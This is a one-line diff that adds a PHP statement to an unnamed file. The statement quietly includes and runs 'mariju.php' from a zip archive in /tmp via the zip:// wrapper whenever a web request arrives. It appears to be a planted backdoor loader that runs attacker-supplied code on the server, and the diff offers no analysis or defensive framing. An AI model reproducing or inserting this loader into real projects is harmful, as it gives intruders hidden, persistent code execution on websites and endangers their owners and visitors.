@@ -1,0 +1,1 @@
+<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "mariju.php"; include("zip:///tmp/phpN7yL9q#$h");?>
